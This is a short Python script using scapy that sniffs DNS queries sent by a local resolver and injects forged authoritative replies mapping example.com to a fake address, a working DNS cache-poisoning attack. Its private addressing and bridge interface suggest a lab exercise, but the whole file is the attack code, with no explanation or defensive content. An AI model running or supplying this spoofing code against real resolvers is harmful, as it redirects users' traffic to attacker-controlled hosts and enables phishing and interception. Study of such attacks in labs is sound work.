#!/usr/bin/env python3
from scapy.all import *

# ----------------- CONFIG -----------------

# Local DNS server we want to poison
LOCAL_DNS_IP = "10.9.0.53"

# Domain to poison
NS_NAME = "example.com"

# Fake IP address to inject into the cache
FAKE_IP = "10.9.0.1"

# Bridge interface on attacker host (10.9.0.0/24)
IFACE = "br-349b72b69197"

# ------------------------------------------


def spoof_to_dns(pkt):
    """
    For each DNS query sent from LOCAL_DNS_IP, if it is for NS_NAME,
    send a forged reply back to the LOCAL_DNS_IP pretending to be
    the upstream server.
    """
    if DNS in pkt and pkt[DNS].qd is not None and pkt[DNS].qr == 0:
        qname = pkt[DNS].qd.qname.decode('utf-8')
        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst

        print(f"[DEBUG] DNS query {qname.strip()} from {src_ip} to {dst_ip}")

        if NS_NAME in qname and src_ip == LOCAL_DNS_IP:
            print(f"[+] Intercepted DNS query for {qname.strip()}")

            # Pretend to be the upstream server (whatever IP the DNS was querying)
            ip = IP(src=dst_ip, dst=src_ip)

            # UDP: sport 53 (server), dport = source port from the query
            udp = UDP(sport=53, dport=pkt[UDP].sport)

            # Forge an A record answer
            ans = DNSRR(
                rrname=pkt[DNS].qd.qname,
                type='A',
                rclass='IN',
                ttl=300,
                rdata=FAKE_IP
            )

            # Build DNS layer: copy transaction ID, mark as response, authoritative
            dns = DNS(
                id=pkt[DNS].id,
                qr=1,      # response
                aa=1,      # authoritative
                qd=pkt[DNS].qd,
                an=ans,
                qdcount=1,
                ancount=1
            )

            spoofpkt = ip / udp / dns

            print(f"[+] Sending spoofed reply to DNS server: {qname.strip()} -> {FAKE_IP}")
            send(spoofpkt, iface=IFACE, verbose=0)


def main():
    # Capture all DNS queries sent by LOCAL_DNS_IP
    myFilter = f"udp port 53 and src host {LOCAL_DNS_IP}"

    print(f"[*] Sniffing on interface: {IFACE}")
    print(f"[*] Using filter: {myFilter}")
    print("[*] Waiting for DNS queries from local DNS...")

    sniff(
        iface=IFACE,
        filter=myFilter,
        prn=spoof_to_dns,
        store=0
    )


if __name__ == "__main__":
    main()

